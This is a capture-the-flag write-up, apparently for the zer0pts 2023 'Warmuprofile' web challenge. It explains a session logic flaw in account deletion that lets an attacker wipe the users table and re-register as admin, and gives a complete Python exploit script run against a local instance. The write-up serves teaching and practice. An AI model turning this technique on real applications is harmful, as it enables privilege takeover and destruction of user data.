+ In this challenge, we have the functionality to login or register a new user
+ After logging in we can check our profile, delete the profile, get flag which can be done only by admin and then logout
+ This application uses sqlite database
+ In POST route /user/:username/delete, we can delete our own profile. It’ll first check the logged in username is admin or the same username as the POST parameter’s value.Then, it’ll find the username’s data. Finally, delete the user’s data and destroy the session.
+ If, we login to the same account with two different sessions, if we delete the account in the first session, the second session is still valid, thus the delete profile route is vulnerable to business logic vulnerability, where it doesn’t check the current session’s user is deleted or not.
+ ![image](https://github.com/Avanthikaanand/My-Writeups/assets/80388135/d0cf5f21-4fef-4b40-9307-ccc99fdf7c85)
As you can see, table Users is deleted, and our new admin user is inserted!!

**Solve.py**
```
#!/usr/bin/env python3
import requests
from base64 import b64encode
from bs4 import BeautifulSoup

class Exploit:
    def __init__(self, baseUrl, isLocal, basicAuthUsername, basicAuthPassword):
        self.baseUrl = baseUrl
        self.isLocal = isLocal
        self.basicAuthUsername = basicAuthUsername
        self.basicAuthPassword = basicAuthPassword

    def basicAuth(self):
        token = b64encode(f'{self.basicAuthUsername}:{self.basicAuthPassword}'.encode('utf-8')).decode('ascii')
        return f'Basic {token}'

    def sendRequest(self, session, method, endpoint, data=None):
        isPostMethod = True if method.lower() == 'post' else False
        isGetMethod = True if method.lower() == 'get' else False
        headers = {'Authorization' : self.basicAuth()} if basicAuthUsername is not None and basicAuthPassword is not None else None

        if isPostMethod:
            if self.isLocal:
                response = session.post(f'{self.baseUrl}{endpoint}', data=data)
                return response.text

            response = session.post(f'{self.baseUrl}{endpoint}', data=data, headers=headers)
            return response.text

        if isGetMethod:
            if self.isLocal:
                response = session.get(f'{self.baseUrl}{endpoint}')
                return response.text

            response = session.get(f'{self.baseUrl}{endpoint}', headers=headers)
            return response.text

if __name__ == '__main__':
    isLocal = True
    basicAuthUsername = None
    basicAuthPassword = None
    baseUrl = 'http://localhost:8600'
    exploit = Exploit(baseUrl, isLocal, basicAuthUsername, basicAuthPassword)

    session1 = requests.Session()
    session2 = requests.Session()
    # Register an account
    username = 'foo'
    password = 'bar'
    registerData = {
        'username': username,
        'password': password,
        'profile': 'foobar'
    }
    print(f'[*] Registering new account "{username}" in session 1')
    exploit.sendRequest(session1, 'POST', '/register', registerData)
    
    # Login to the account with 2 different session
    loginData = {
        'username': username,
        'password': password
    }
    print(f'[*] Logging in to new account "{username}" in session 1')
    exploit.sendRequest(session1, 'POST', '/login', loginData)
    print(f'[*] Logging in to new account "{username}" in session 2')
    exploit.sendRequest(session2, 'POST', '/login', loginData)

    # Delete the first and second session's user
    deleteUserEndpoint = f'/user/{username}/delete'
    print(f'[*] Deleting new account "{username}" in session 1')
    exploit.sendRequest(session1, 'POST', deleteUserEndpoint)
    print(f'[*] Deleting new account "{username}" in session 2')
    exploit.sendRequest(session2, 'POST', deleteUserEndpoint)

    # Register our new "admin" user as the `Users` table is deleted
    overwriteAdminUserData = {
        'username': 'admin',
        'password': 'admin',
        'profile': 'never_gonna_give_you_up'
    }
    print(f'[*] Overwriting old admin user in session 1')
    overwriteAdminUserResponse = exploit.sendRequest(session1, 'POST', '/register', overwriteAdminUserData)
    if 'user exists' in overwriteAdminUserResponse:
        print(f'[-] Failed to overwrite the admin user...')
        exit()

    # Get the flag as the new admin user
    print(f'[*] Getting the flag in session 1')
    flagResponse = exploit.sendRequest(session1, 'GET', '/flag')
    if 'The flag is:' not in flagResponse:
        print(f'[-] Failed to get the flag...')
        exit()

    soup = BeautifulSoup(flagResponse, 'html.parser')
    flag = soup.code.get_text()
    print(f'[+] Flag: {flag}')
```


Original writeup:
+https://siunam321.github.io/ctf/zer0pts-CTF-2023/web/Warmuprofile/
+ https://portswigger.net/web-security/logic-flaws
